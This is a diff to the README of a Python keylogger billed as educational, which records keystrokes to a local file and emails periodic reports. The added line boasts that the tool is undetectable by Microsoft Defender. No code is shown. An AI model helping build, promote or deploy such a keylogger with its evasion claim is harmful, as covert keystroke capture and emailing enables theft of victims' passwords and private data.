@@ -2,7 +2,7 @@
 
 ## Overview
 
-This project is a **Python-based keylogger** designed for educational purposes. It records keystrokes, saves the data in a local file, and sends periodic keylog reports via email.
+This project is a **Python-based keylogger** designed for educational purposes. It records keystrokes, saves the data in a local file, and sends periodic keylog reports via email. THIS IS ALSO TOTALLY UNDETECTABLE AS OF 24/4/2025 UPDATE BY MICROSOFT DEFENDER
 
 ### Features:
 - **Keystroke Logging**: Captures keystrokes and saves them in `keylog.txt`.
